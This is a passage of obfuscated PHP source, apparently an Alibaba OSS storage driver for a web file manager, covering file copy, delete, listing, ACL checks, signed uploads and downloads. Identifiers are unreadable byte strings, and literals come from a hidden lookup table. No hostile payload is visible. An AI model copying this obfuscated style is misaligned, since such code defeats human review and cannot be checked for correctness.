$Üàö¬ö† = $›öşÊº->getLastModified(); $âüÒÑÀ = $ÅìŠ¾Å” ? array($÷“å‘É[42] => $áôõ¬, $÷“å‘É[86] => $‘˜¶Úß‰, $÷“å‘É[190] => strtotime($Üàö¬ö†)) : $áôõ¬; $š ş™ıÌ = $‘˜¶Úß‰ == 0 && substr($áôõ¬, strlen($áôõ¬) - 1, 1) == $÷“å‘É[8] ? !0 : !1; $Ğ›ÂĞ = array($÷“å‘É[86] => $‘˜¶Úß‰, $÷“å‘É[1409] => $‘˜¶Úß‰, $÷“å‘É[95] => strtotime($Üàö¬ö†), $÷“å‘É[1410] => $Üàö¬ö†); $this->cacheMethodInfoSet($áôõ¬, $š ş™ıÌ, $Ğ›ÂĞ); if ($š ş™ıÌ) { $›ƒåÃï€[] = $áôõ¬; continue; } $‹ûÅÆÓœ[] = $âüÒÑÀ; } foreach ($¬Ò¶ÀÒ¥ as $»®‹í ç) { $›ƒåÃï€[] = $»®‹í ç->getPrefix(); $this->cacheMethodInfoSet($»®‹í ç->getPrefix(), !0); } if ($Ì˜è„Ù === $÷“å‘É[12]) { break; } } $this->cacheMethodInfoSet($ÁŞ†•êŞ, !0); return array($÷“å‘É[92] => $›ƒåÃï€, $÷“å‘É[93] => $‹ûÅÆÓœ); } public function copyFile($üÏ‹¼×’, $Şààë•) { $†»°½Á¿ = $this->size($üÏ‹¼×’); if ($†»°½Á¿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $üÏ‹¼×’, $this->bucket, $this->pathEncode($Şààë•)); } catch (OSS\Core\OssException $Ğ¹„©ƒ) { return !1; } return $this->getPathOuter($Şààë•); } $íÄò€š = $this->multiCopyObject($üÏ‹¼×’, $Şààë•, $†»°½Á¿); return $íÄò€š ? $this->getPathOuter($Şààë•) : !1; } private function multiCopyObject($Û§¤úî€, $úıı‡öı, $¤™¦şğ) { $é¸­Á‘¨ =& $_SERVER[ªÏ§Ë·]; try { $Êû¿Â°‰ = array(); if ($¡û‹‰®¼ = $this->hashMd5($Û§¤úî€)) { $Êû¿Â°‰ = array(OSS\OssClient::OSS_HEADERS => array($é¸­Á‘¨[1411] => $¡û‹‰®¼)); } $ºıĞıåè = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($úıı‡öı), $Êû¿Â°‰); $²ú¬ß©â = 1; $Øé¤Ó€’ = 0; $Ã®Ø“ƒ = array(); $îÜÁÈ„· = 1024 * 1024 * 10; $Ñ•¾ï±˜ = $this->client->generateMultiuploadParts($¤™¦şğ, $îÜÁÈ„·); foreach ($Ñ•¾ï±˜ as $ì™®«ä => $¨‘³ø«) { $é‡Ì¹úä = $Øé¤Ó€’ + (int) $¨‘³ø«[$é¸­Á‘¨[1412]]; $‰ŸÅÆïï = (int) $¨‘³ø«[$é¸­Á‘¨[375]] + $é‡Ì¹úä - 1; $Ù–ä¦É = array($é¸­Á‘¨[1413] => $é‡Ì¹úä, $é¸­Á‘¨[1414] => $‰ŸÅÆïï); $Ã®Ø“ƒ[] = $this->client->uploadPartCopy($this->bucket, $Û§¤úî€, $this->bucket, $this->pathEncode($úıı‡öı), $²ú¬ß©â, $ºıĞıåè, $Ù–ä¦É); $²ú¬ß©â = $²ú¬ß©â + 1; } $ƒËÆŠ† = array(); foreach ($Ã®Ø“ƒ as $ì™®«ä => $‘Ö€ç¹) { $ƒËÆŠ†[] = array($é¸­Á‘¨[1415] => $ì™®«ä + 1, $é¸­Á‘¨[1416] => $‘Ö€ç¹); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($úıı‡öı), $ºıĞıåè, $ƒËÆŠ†); } catch (OSS\Core\OssException $µ“Ààş²) { return !1; } return !0; } public function moveFile($ß¬ö…, $”¯·ê) { if ($this->copyFile($ß¬ö…, $”¯·ê)) { $this->remove($ß¬ö…); return $this->getPathOuter($”¯·ê); } return !1; } public function delFile($ƒÚ‰·) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ƒÚ‰·)); } catch (OSS\Core\OssException $ÖÏÉ¤”Ç) { return !1; } return !0; } public function delFolder($ìÚš¼¥±) { $Á°³Ø•— =& $_SERVER[ªÏ§Ë·]; if (!$this->exist($ìÚš¼¥±)) { return !0; } $this->listItemCache = !1; $şú¦¿‚ = $this->fileList($ìÚš¼¥±); $this->listItemCache = !0; $ËÁĞÎ‹½ = trim($ìÚš¼¥±, $Á°³Ø•—[8]) . $Á°³Ø•—[8]; if (!empty($ìÚš¼¥±) && $ìÚš¼¥± !== $Á°³Ø•—[208] && !in_array($ËÁĞÎ‹½, $şú¦¿‚[$Á°³Ø•—[92]])) { $şú¦¿‚[$Á°³Ø•—[92]][] = $ËÁĞÎ‹½; } $Â›ç¢ª› = $this->delByBatch($şú¦¿‚[$Á°³Ø•—[93]]); if (!$Â›ç¢ª›) { return !1; } $Â›ç¢ª› = $this->delByBatch($şú¦¿‚[$Á°³Ø•—[92]]); if (!$Â›ç¢ª›) { return !1; } return $this->delFile($ËÁĞÎ‹½); } private function delByBatch($ÖùŸ¿¼”) { foreach (array_chunk($ÖùŸ¿¼”, 1000) as $ÙáÌ€Ø±) { try { $this->client->deleteObjects($this->bucket, $ÙáÌ€Ø±); } catch (OSS\Core\OssException $Å×Â–úö) { return !1; } } return !0; } public function rename($×²¯²Îä, $Äıçêó) { return $this->renameObject($×²¯²Îä, $Äıçêó); } private function fileInfo($á’úÅš‚, $ ôùÔºâ = false, $ÕØ¡ä¤² = array()) { $ùû¬à‚» =& $_SERVER[ªÏ§Ë·]; $¢îÜŒæ§ = array($ùû¬à‚»[42] => $this->pathThis($á’úÅš‚), $ùû¬à‚»[94] => $this->getPathOuter($á’úÅš‚), $ùû¬à‚»[43] => $ùû¬à‚»[210], $ùû¬à‚»[86] => isset($ÕØ¡ä¤²[$ùû¬à‚»[86]]) ? $ÕØ¡ä¤²[$ùû¬à‚»[86]] : 0, $ùû¬à‚»[184] => $this->ext($á’úÅš‚)); if ($ ôùÔºâ) { return $¢îÜŒæ§; } $¢îÜŒæ§[$ùû¬à‚»[211]] = $¢îÜŒæ§[$ùû¬à‚»[95]] = 0; $¢îÜŒæ§[$ùû¬à‚»[212]] = $¢îÜŒæ§[$ùû¬à‚»[213]] = !0; if (empty($ÕØ¡ä¤²)) { $ÏßÍ®Ø = $this->objectMeta($á’úÅš‚); if (!$ÏßÍ®Ø) { return $¢îÜŒæ§; } $ÕØ¡ä¤² = array($ùû¬à‚»[95] => strtotime($ÏßÍ®Ø[$ùû¬à‚»[1410]]), $ùû¬à‚»[86] => $ÏßÍ®Ø[$ùû¬à‚»[1409]] + 0); } if (isset($ÕØ¡ä¤²[$ùû¬à‚»[86]])) { $¢îÜŒæ§[$ùû¬à‚»[86]] = $ÕØ¡ä¤²[$ùû¬à‚»[86]]; } if (isset($ÕØ¡ä¤²[$ùû¬à‚»[95]])) { $¢îÜŒæ§[$ùû¬à‚»[95]] = $ÕØ¡ä¤²[$ùû¬à‚»[95]]; } if (isset($ÕØ¡ä¤²[$ùû¬à‚»[190]]) && !trim($¢îÜŒæ§[$ùû¬à‚»[95]])) { $¢îÜŒæ§[$ùû¬à‚»[95]] = $ÕØ¡ä¤²[$ùû¬à‚»[190]]; } return $¢îÜŒæ§; } private function folderInfo($şì¼´•á, $îïÊÛ·Ê = false, $úƒµ­´† = array()) { $²şˆ¦Ó¿ =& $_SERVER[ªÏ§Ë·]; $ä¬Ä™÷Ó = array($²şˆ¦Ó¿[42] => $this->pathThis($şì¼´•á), $²şˆ¦Ó¿[94] => $this->getPathOuter($²şˆ¦Ó¿[8] . $şì¼´•á), $²şˆ¦Ó¿[43] => $²şˆ¦Ó¿[85]); if ($îïÊÛ·Ê) { return $ä¬Ä™÷Ó; } $ä¬Ä™÷Ó[$²şˆ¦Ó¿[211]] = $ä¬Ä™÷Ó[$²şˆ¦Ó¿[95]] = 0; $ä¬Ä™÷Ó[$²şˆ¦Ó¿[212]] = $ä¬Ä™÷Ó[$²şˆ¦Ó¿[213]] = !0; if (empty($úƒµ­´†)) { $şì¼´•á = rtrim($şì¼´•á, $²şˆ¦Ó¿[8]) . $²şˆ¦Ó¿[8]; $©˜†­€† = $this->objectMeta($şì¼´•á); if (!$©˜†­€†) { return $ä¬Ä™÷Ó; } $úƒµ­´† = array($²şˆ¦Ó¿[211] => $©˜†­€†[$²şˆ¦Ó¿[540]][$²şˆ¦Ó¿[1417]], $²şˆ¦Ó¿[95] => strtotime($©˜†­€†[$²şˆ¦Ó¿[1410]])); } if (isset($úƒµ­´†[$²şˆ¦Ó¿[95]])) { $ä¬Ä™÷Ó[$²şˆ¦Ó¿[95]] = $úƒµ­´†[$²şˆ¦Ó¿[95]]; } if (isset($úƒµ­´†[$²şˆ¦Ó¿[211]])) { $ä¬Ä™÷Ó[$²şˆ¦Ó¿[211]] = $úƒµ­´†[$²şˆ¦Ó¿[211]]; } return $ä¬Ä™÷Ó; } public function listPath($ºÂ€èˆ, $À­Í„¤‚ = false) { $¦®™–Éä =& $_SERVER[ªÏ§Ë·]; $ëú¶İó÷ = $this->fileList($ºÂ€èˆ, $¦®™–Éä[8], !0); foreach ($ëú¶İó÷[$¦®™–Éä[92]] as $Ï›²‘Ê => $àé÷œ«í) { $ëú¶İó÷[$¦®™–Éä[92]][$Ï›²‘Ê] = $this->folderInfo($àé÷œ«í, $À­Í„¤‚, $àé÷œ«í); } foreach ($ëú¶İó÷[$¦®™–Éä[93]] as $Ï›²‘Ê => $àé÷œ«í) { $ëú¶İó÷[$¦®™–Éä[93]][$Ï›²‘Ê] = $this->fileInfo($àé÷œ«í[$¦®™–Éä[42]], $À­Í„¤‚, $àé÷œ«í); } return $ëú¶İó÷; } protected function infoChildren($Æª°™ã, &$°£Ó…¾Ä) { $‚Ğñó³› =& $_SERVER[ªÏ§Ë·]; $åü¼¬Ò˜ = $this->fileList($Æª°™ã, $‚Ğñó³›[12], !0); $°£Ó…¾Ä[$‚Ğñó³›[88]] += count($åü¼¬Ò˜[$‚Ğñó³›[92]]); $°£Ó…¾Ä[$‚Ğñó³›[87]] += count($åü¼¬Ò˜[$‚Ğñó³›[93]]); foreach ($åü¼¬Ò˜[$‚Ğñó³›[93]] as $°¡ŸşÂ) { if (!$°¡ŸşÂ || !$°¡ŸşÂ[$‚Ğñó³›[86]]) { continue; } $°£Ó…¾Ä[$‚Ğñó³›[86]] += $°¡ŸşÂ[$‚Ğñó³›[86]]; } } public function has($Ä®ÅŸÑ, $°®Ïıá = false, $ÆÔ‡Ãµû = true) { $Æ¼ŠËº¯ =& $_SERVER[ªÏ§Ë·]; $Ä®ÅŸÑ = trim($Ä®ÅŸÑ, $Æ¼ŠËº¯[8]); $½‚©Ä“® = empty($Ä®ÅŸÑ) && $Ä®ÅŸÑ !== $Æ¼ŠËº¯[208] ? $Æ¼ŠËº¯[12] : $Ä®ÅŸÑ . $Æ¼ŠËº¯[8]; $âæŠçÍ† = $Æ¼ŠËº¯[12]; $ÖõÅ¸ÜÉ = 500; $Á¨½ÔŒ³ = $¼¹ùÇ = 0; while (!0) { check_abort(); $‡¯äŒ¯ä = array($Æ¼ŠËº¯[1405] => $Æ¼ŠËº¯[8], $Æ¼ŠËº¯[1406] => $½‚©Ä“®, $Æ¼ŠËº¯[1407] => $ÖõÅ¸ÜÉ, $Æ¼ŠËº¯[1408] => $âæŠçÍ†); try { $ğÁéÒ²­ = $this->client->listObjects($this->bucket, $‡¯äŒ¯ä); } catch (OSS\Core\OssException $¤…©°‰¶) { break; } $âæŠçÍ† = $ğÁéÒ²­->getNextMarker(); $µå¯¬²À = $ğÁéÒ²­->getObjectList(); $¢ùö¡şä = $ğÁéÒ²­->getPrefixList(); if ($°®Ïıá) { if (count($µå¯¬²À) > 1 || count($µå¯¬²À) == 1 && $µå¯¬²À[0]->getKey() != $½‚©Ä“®) { $Á¨½ÔŒ³ += count($µå¯¬²À) - 1; } if (!empty($¢ùö¡şä)) { $¼¹ùÇ += count($¢ùö¡şä); } if ($âæŠçÍ† === $Æ¼ŠËº¯[12]) { break; } continue; } if ($ÆÔ‡Ãµû) { if (!empty($µå¯¬²À)) { if (count($µå¯¬²À) > 1 || $µå¯¬²À[0]->getKey() != $½‚©Ä“®) { return !0; } } } else { if (!empty($¢ùö¡şä)) { return !0; } } if ($âæŠçÍ† === $Æ¼ŠËº¯[12]) { break; } } if ($°®Ïıá) { return array($Æ¼ŠËº¯[217] => $Á¨½ÔŒ³, $Æ¼ŠËº¯[218] => $¼¹ùÇ); } return !1; } public function listAll($ÍÃ¸¶àû) { $ìğ«Ø›æ =& $_SERVER[ªÏ§Ë·]; $È¯ÈŒ³† = $this->fileList($ÍÃ¸¶àû, $ìğ«Ø›æ[12], !0); $¡·üÊúÎ = array_to_keyvalue($È¯ÈŒ³†[$ìğ«Ø›æ[93]], $ìğ«Ø›æ[42]); foreach ($È¯ÈŒ³†[$ìğ«Ø›æ[92]] as $ó«á‡ ˜) { if (is_string($ó«á‡ ˜)) { $¡·üÊúÎ[$ó«á‡ ˜] = array($ìğ«Ø›æ[86] => 0); } } return $this->listAllFiles($ÍÃ¸¶àû, $¡·üÊúÎ); } public function canRead($õ“½Ğ²) { $’˜¶ÈÜÕ =& $_SERVER[ªÏ§Ë·]; $ü˜İôğå = $this->pathAcl($õ“½Ğ²); return $ü˜İôğå == $’˜¶ÈÜÕ[1418] || $ü˜İôğå == $’˜¶ÈÜÕ[585] ? !0 : !1; } public function canWrite($÷–ëÂÖ‹) { $€Í€Û³ö = $this->pathAcl($÷–ëÂÖ‹); return $€Í€Û³ö == $_SERVER[ªÏ§Ë·][585] ? !0 : !1; } public function pathAcl($éõŞõ§) { $É§ş×ö =& $_SERVER[ªÏ§Ë·]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $±©¦½ñ¯ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($éõŞõ§)); } catch (OSS\Core\OssException $ÜÈûˆî) { return !1; } $´ô—§ôı = $±©¦½ñ¯ == $É§ş×ö[47] ? $this->bucketAcl : $±©¦½ñ¯; if ($´ô—§ôı == $É§ş×ö[1419]) { return $É§ş×ö[1418]; } if ($´ô—§ôı == $É§ş×ö[1420]) { return $É§ş×ö[585]; } return $´ô—§ôı; } private function chmodPath($÷€¥©¢µ, $óÛ³­Ş£ = '') { $—ºü³×Ô =& $_SERVER[ªÏ§Ë·]; $ûñíğé = empty($óÛ³­Ş£) ? $—ºü³×Ô[1420] : $óÛ³­Ş£; $ô»¯ÓâÂ = array($—ºü³×Ô[47], $—ºü³×Ô[209], $—ºü³×Ô[1419], $—ºü³×Ô[1420]); if (!in_array($ûñíğé, $ô»¯ÓâÂ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($÷€¥©¢µ), $ûñíğé); } catch (OSS\Core\OssException $„Š¿—Ñ±) { return !1; } return !0; } public function getContent($“§ºÚ×) { return $this->fileSubstr($“§ºÚ×, -1); } public function setContent($ì¼¡Î‘Š, $ıÕ”¤ = '') { $²à­Ô¶œ =& $_SERVER[ªÏ§Ë·]; try { $¾êñû‰î = $this->trafficLimit($²à­Ô¶œ[1421]); $¦§ÅÂâõ = $this->client->putObject($this->bucket, $this->pathEncode($ì¼¡Î‘Š), $ıÕ”¤, $¾êñû‰î); } catch (OSS\Core\OssException $©±…Ğ¹€) { return !1; } $€÷İÜĞ« = array($²à­Ô¶œ[1411] => trim($¦§ÅÂâõ[$²à­Ô¶œ[1422]], $²à­Ô¶œ[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ì¼¡Î‘Š))); $this->updateObjMeta($ì¼¡Î‘Š, $€÷İÜĞ«); return isset($¦§ÅÂâõ[$²à­Ô¶œ[1423]][$²à­Ô¶œ[269]]) ? !0 : !1; } private function updateObjMeta($ïóĞÍğ†, $üÔõ™ö´) { $ïóĞÍğ† = $this->pathEncode($ïóĞÍğ†); try { $Ãª®¹û = array(OSS\OssClient::OSS_HEADERS => $üÔõ™ö´); $this->client->copyObject($this->bucket, $ïóĞÍğ†, $this->bucket, $ïóĞÍğ†, $Ãª®¹û); } catch (OSS\Core\OssException $‚¸ïĞÚç) { return !1; } return !0; } public function upload($‹ïÉòİ, $ïìÜø©Î, $æ²ˆÊ‹” = false, $©ì¼ÏÏ… = REPEAT_REPLACE) { $ı‹´öÜ =& $_SERVER[ªÏ§Ë·]; $ÂÒõ°ß§ = trim($‹ïÉòİ, $ı‹´öÜ[8]); $‹– şçş = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ı‹´öÜ[1411] => @md5_file($ïìÜø©Î)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‹ïÉòİ))); $‹– şçş = $this->trafficLimit($ı‹´öÜ[1421], $‹– şçş); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÂÒõ°ß§), $ïìÜø©Î, $‹– şçş); } catch (OSS\Core\OssException $Ô…†âĞï) { return !1; } return $this->getPathOuter($‹ïÉòİ); } public function getHost() { $¤„óçø =& $_SERVER[ªÏ§Ë·]; $È‹áÃ‘• = explode($¤„óçø[194], parent::getHost()); return $È‹áÃ‘•[0] . $¤„óçø[194] . $this->bucket . $¤„óçø[10] . $È‹áÃ‘•[1]; } public function uploadFormData($ÃÂˆÓùÁ, $ú¤–˜í = 3600) { $­¼³ƒİ¢ =& $_SERVER[ªÏ§Ë·]; if (!($ ê£Á¹ = $this->getHost())) { return !1; } $‹æ‚à§â = $ú¤–˜í; $è–ğİäÒ = date($­¼³ƒİ¢[1424], time() + $‹æ‚à§â); $‰Û¾šÌÙ = new DateTime($è–ğİäÒ); $Ã«Œà« = $‰Û¾šÌÙ->format(DateTime::ISO8601); $”äâ‹…Ö = strpos($Ã«Œà«, $­¼³ƒİ¢[334]); $Ã«Œà« = substr($Ã«Œà«, 0, $”äâ‹…Ö) . $­¼³ƒİ¢[1425]; $í®¾ô = 1048576000 * 5; $„­°×æ = $this->pathFather($ÃÂˆÓùÁ); $º¢ğå½€ = array($­¼³ƒİ¢[252] => $Ã«Œà«, $­¼³ƒİ¢[255] => array(array($­¼³ƒİ¢[1426], 0, $í®¾ô), array($­¼³ƒİ¢[258], $­¼³ƒİ¢[259], $„­°×æ))); $­ª¯·ßØ = base64_encode(json_encode($º¢ğå½€)); $Ì¡Æ—¦ô = base64_encode(hash_hmac($­¼³ƒİ¢[241], $­ª¯·ßØ, $this->secret, !0)); $îÌ÷º¡ = array($­¼³ƒİ¢[270] => $­ª¯·ßØ, $­¼³ƒİ¢[1427] => $this->accessKey, $­¼³ƒİ¢[262] => $­¼³ƒİ¢[251], $­¼³ƒİ¢[1428] => $Ì¡Æ—¦ô, $­¼³ƒİ¢[192] => $ ê£Á¹); $îÌ÷º¡ = $this->trafficLimit($­¼³ƒİ¢[1421], $îÌ÷º¡); return $îÌ÷º¡; } public function multiUploadFormData($÷…çúÁë, $½ÆÁ…Î = 3600) { $ı ½ìËÓ =& $_SERVER[ªÏ§Ë·]; if (!($Ç·ºˆĞ = $this->getHost())) { return !1; } $Ï¾­ƒç = $this->trafficLimit($ı ½ìËÓ[1421]); $Ç¶‰Ï¨ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($÷…çúÁë), $Ï¾­ƒç); return array($ı ½ìËÓ[233] => $Ç¶‰Ï¨, $ı ½ìËÓ[192] => $Ç·ºˆĞ . $ı ½ìËÓ[8] . $this->pathEncode($÷…çúÁë), $ı ½ìËÓ[234] => gmdate($ı ½ìËÓ[1429]), $ı ½ìËÓ[104] => $÷…çúÁë); } public function multiUploadAuthData($Å£¹æ˜«, $Ç‚–Ìïİ = array()) { $Æ°ƒÏµ² =& $_SERVER[ªÏ§Ë·]; $Û€ä…ÑÓ = isset($Ç‚–Ìïİ[$Æ°ƒÏµ²[234]]) ? $Ç‚–Ìïİ[$Æ°ƒÏµ²[234]] : gmdate($Æ°ƒÏµ²[1429]); $“Å£Ì•‚ = isset($Ç‚–Ìïİ[$Æ°ƒÏµ²[184]]) ? $Ç‚–Ìïİ[$Æ°ƒÏµ²[184]] : $Æ°ƒÏµ²[12]; $ô””³Ğå = $Å£¹æ˜«; if (isset($Ç‚–Ìïİ[$Æ°ƒÏµ²[104]])) { $ô””³Ğå = $Ç‚–Ìïİ[$Æ°ƒÏµ²[104]]; unset($Ç‚–Ìïİ[$Æ°ƒÏµ²[104]]); } if (isset($Ç‚–Ìïİ[$Æ°ƒÏµ²[235]])) { $Ç‚–Ìïİ[$Æ°ƒÏµ²[234]] = $Û€ä…ÑÓ; return $this->listUploadParts($ô””³Ğå, $Ç‚–Ìïİ); } $›¿Í½ºü = array($Æ°ƒÏµ²[236], $Æ°ƒÏµ²[12], $Æ°ƒÏµ²[130], $Û€ä…ÑÓ, "\x78\55\157\x73\163\55\x64\141\164\x65\72{$Û€ä…ÑÓ}", $Æ°ƒÏµ²[8] . $this->bucket . $Æ°ƒÏµ²[8] . $ô””³Ğå . $“Å£Ì•‚); if (strpos($“Å£Ì•‚, $Æ°ƒÏµ²[237]) === 0) { $›¿Í½ºü[0] = $Æ°ƒÏµ²[238]; if ($›£íµÔ = $this->trafficLimit($Æ°ƒÏµ²[1421])) { $ô””³Ğå = $Æ°ƒÏµ²[1430]; array_splice($›¿Í½ºü, 5, 0, $ô””³Ğå . $Æ°ƒÏµ²[4] . $›£íµÔ[$ô””³Ğå]); } } if (isset($Ç‚–Ìïİ[$Æ°ƒÏµ²[239]]) && $Ç‚–Ìïİ[$Æ°ƒÏµ²[239]] == $Æ°ƒÏµ²[240]) { $›¿Í½ºü[0] = $Æ°ƒÏµ²[240]; } if (!empty($Ç‚–Ìïİ[$Æ°ƒÏµ²[1431]])) { $ü†à²Ÿ± = array_merge(array($›¿Í½ºü[4]), $Ç‚–Ìïİ[$Æ°ƒÏµ²[1431]]); sort($ü†à²Ÿ±); $›¿Í½ºü[4] = implode($Æ°ƒÏµ²[19], $ü†à²Ÿ±); } $°ÏÓÌó = implode($Æ°ƒÏµ²[19], $›¿Í½ºü); $ÆÉÂÆ“Ò = base64_encode(hash_hmac($Æ°ƒÏµ²[241], $°ÏÓÌó, $this->secret, !0)); $ß–ËÛÒ = $Æ°ƒÏµ²[1395] . $this->accessKey . $Æ°ƒÏµ²[4] . $ÆÉÂÆ“Ò; if (strpos($“Å£Ì•‚, $Æ°ƒÏµ²[237]) === 0) { $ß–ËÛÒ = array($Æ°ƒÏµ²[243] => $ß–ËÛÒ, $Æ°ƒÏµ²[234] => $Û€ä…ÑÓ); if ($›£íµÔ) { $ß–ËÛÒ = array_merge($ß–ËÛÒ, $›£íµÔ); } } return $ß–ËÛÒ; } public function listUploadParts($Šè³ûùò, $Ì¹Ï˜ŒÎ) { $­¾Äşƒ =& $_SERVER[ªÏ§Ë·]; $–­Ï¶½ª = parse_url_query($Ì¹Ï˜ŒÎ[$­¾Äşƒ[184]]); $ş„¡â½ = $this->client->listParts($this->bucket, $this->pathEncode($Šè³ûùò), $–­Ï¶½ª[$­¾Äşƒ[233]]); $œ¬„˜Ÿ = $ş„¡â½->getListPart(); $¸×¦ì’ò = array(); foreach ($œ¬„˜Ÿ as $ë¼µÎ˜è) { $¸×¦ì’ò[] = array($­¾Äşƒ[1415] => $ë¼µÎ˜è->getPartNumber(), $­¾Äşƒ[1416] => trim($ë¼µÎ˜è->getETag(), $­¾Äşƒ[128])); } unset($Ì¹Ï˜ŒÎ[$­¾Äşƒ[235]], $Ì¹Ï˜ŒÎ[$­¾Äşƒ[239]]); $âšøÒó¯ = $this->multiUploadAuthData($Šè³ûùò, $Ì¹Ï˜ŒÎ); if (empty($âšøÒó¯)) { return !1; } return array($­¾Äşƒ[243] => $âšøÒó¯, $­¾Äşƒ[234] => $Ì¹Ï˜ŒÎ[$­¾Äşƒ[234]], $­¾Äşƒ[245] => $¸×¦ì’ò); } public function download($ÃÈî¡ƒ³, $Ã˜¦ƒÍÊ) { if ($this->isFolder($ÃÈî¡ƒ³)) { return !1; } try { $­»¥®¢§ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ã˜¦ƒÍÊ); $­»¥®¢§ = $this->trafficLimit($_SERVER[ªÏ§Ë·][119], $­»¥®¢§); $this->client->getObject($this->bucket, $this->pathEncode($ÃÈî¡ƒ³), $­»¥®¢§); } catch (OSS\Core\OssException $ë»£Á) { return !1; } return $Ã˜¦ƒÍÊ; } public function fileSubstr($Ï’Úê´, $üÔö²Œ¾ = 0, $†§•ê•ø = false) { if ($üÔö²Œ¾ === -1) { $ŒÄ‡ìì÷ = array(); } else { if ($†§•ê•ø === !1) { $˜÷îøı’ = $this->size($Ï’Úê´); } else { $˜÷îøı’ = $üÔö²Œ¾ + $†§•ê•ø - 1; } $ŒÄ‡ìì÷ = array(OSS\OssClient::OSS_RANGE => "{$üÔö²Œ¾}\x2d{$˜÷îøı’}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ï’Úê´), $ŒÄ‡ìì÷); } catch (OSS\Core\OssException $º„áÀ™–) { think_exception($º„áÀ™–->getMessage()); return !1; } } private function trafficLimit($¶ÊµÒë, $—µÈ‚¢¾ = array()) { $ Ò™†Âë =& $_SERVER[ªÏ§Ë·]; if ($¶ÊµÒë == $ Ò™†Âë[1421] && $this->isUploadServer() || $¶ÊµÒë == $ Ò™†Âë[119] && $this->isFileOutServer()) { return $—µÈ‚¢¾; } $‰„½éää = floatval($GLOBALS[$ Ò™†Âë[6]][$ Ò™†Âë[99]][$ Ò™†Âë[117]][$¶ÊµÒë]) * 1024 * 1024 * 8; if (!$‰„½éää) { return $—µÈ‚¢¾; } $‰„½éää = $‰„½éää < 819200 ? 819200 : ($‰„½éää > 838860800 ? 838860800 : $‰„½éää); $—µÈ‚¢¾[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‰„½éää); return $—µÈ‚¢¾; } public function link($£Ñé«€, $‡”¡ê¥œ = array()) { $Ç¹¼¾µ£ =& $_SERVER[ªÏ§Ë·]; if (!$this->exist($£Ñé«€) || $this->isFolder($£Ñé«€)) { return !1; } try { $‡”¡ê¥œ = $this->trafficLimit($Ç¹¼¾µ£[119], $‡”¡ê¥œ); $êÚÒŸ²Å = $this->client->signUrl($this->bucket, $this->pathEncode($£Ñé«€), 3600 * 12, $Ç¹¼¾µ£[240], $‡”¡ê¥œ); return $this->getCdnLink($êÚÒŸ²Å); } catch (OSS\Core\OssException $«İáµ¥¡) { return !1; } } public function fileOut($·¤®„ÑÁ, $×µ¬ÁÕñ = false, $ëì›è£— = false, $·£×¬°ü = '') { $™ÑçË­ø =& $_SERVER[ªÏ§Ë·]; if ($this->isFileOutServer()) { return $this->fileOutServer($·¤®„ÑÁ, $×µ¬ÁÕñ, $ëì›è£—, $·£×¬°ü); } if (!$ëì›è£—) { $ëì›è£— = $this->pathThis($·¤®„ÑÁ); } $ëì›è£— = rawurlencode($ëì›è£—); $ÓÍÅ‘Æƒ = get_file_mime(get_path_ext($ëì›è£—)); if ($ÓÍÅ‘Æƒ == $™ÑçË­ø[227]) { return parent::fileOut($·¤®„ÑÁ, $×µ¬ÁÕñ, $ëì›è£—, $·£×¬°ü); } $×µ¬ÁÕñ = $×µ¬ÁÕñ ? $™ÑçË­ø[1432] : $™ÑçË­ø[1433]; $éæ‚Á„ä = array(OSS\OssClient::OSS_SUB_RESOURCE => $™ÑçË­ø[1434] . rawurlencode("{$×µ¬ÁÕñ}\x3b\x66\151\x6c\x65\156\x61\x6d\145\x3d{$ëì›è£—}")); $éæ‚Á„ä[OSS\OssClient::OSS_SUB_RESOURCE] .= $™ÑçË­ø[1435] . rawurlencode($ÓÍÅ‘Æƒ); $ĞÊõ„™Ş = $this->link($·¤®„ÑÁ, $éæ‚Á„ä); $this->fileOutLink($ĞÊõ„™Ş); } public function fileOutServer($ü¥ó¶öè, $’ªíÒ™Å = false, $È†×òê = false, $Í¬µÀï = '') { parent::fileOut($ü¥ó¶öè, $’ªíÒ™Å, $È†×òê, $Í¬µÀï); } public function fileOutImage($æ³İÏ”, $´œÆĞİÑ = 250) { if ($this->size($æ³İÏ”) > 1024 * 1024 * 20) { return $this->fileOutImageServer($æ³İÏ”, $´œÆĞİÑ); } $ Õ®÷¥˜ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ªÏ§Ë·][1436] . $´œÆĞİÑ); $øë³Èê = $this->link($æ³İÏ”, $ Õ®÷¥˜); $this->fileOutLink($øë³Èê); } public function fileOutImageServer($Ÿæó”£„, $œ¦—ê´ª = 250) { parent::fileOutImage($Ÿæó”£„, $œ¦—ê´ª); } public function fileOutLink($«š¶Ç) { $ÍÜ›¥ùº =& $_SERVER[ªÏ§Ë·]; if (!$this->isCdnHost() && substr($«š¶Ç, 0, 7) == $ÍÜ›¥ùº[1356]) { $«š¶Ç = $ÍÜ›¥ùº[1357] . substr($«š¶Ç, 7); } header($ÍÜ›¥ùº[171] . $«š¶Ç); die; } public function hashMd5($¨¹Ö·ó, $çš•şß„ = '') { $ÛşŸö§Œ =& $_SERVER[ªÏ§Ë·]; $“šĞğÎÃ = $this->_objectMeta($¨¹Ö·ó); if (!$“šĞğÎÃ) { return $ÛşŸö§Œ[12]; } if (!isset($“šĞğÎÃ[$ÛşŸö§Œ[1411]]) && !empty($çš•şß„)) { $ÁŠÍîƒ = $this->updateObjMeta($¨¹Ö·ó, array($ÛşŸö§Œ[1411] => $çš•şß„)); $“šĞğÎÃ[$ÛşŸö§Œ[1411]] = $ÁŠÍîƒ ? $çš•şß„ : $ÛşŸö§Œ[12]; } return isset($“šĞğÎÃ[$ÛşŸö§Œ[1411]]) ? 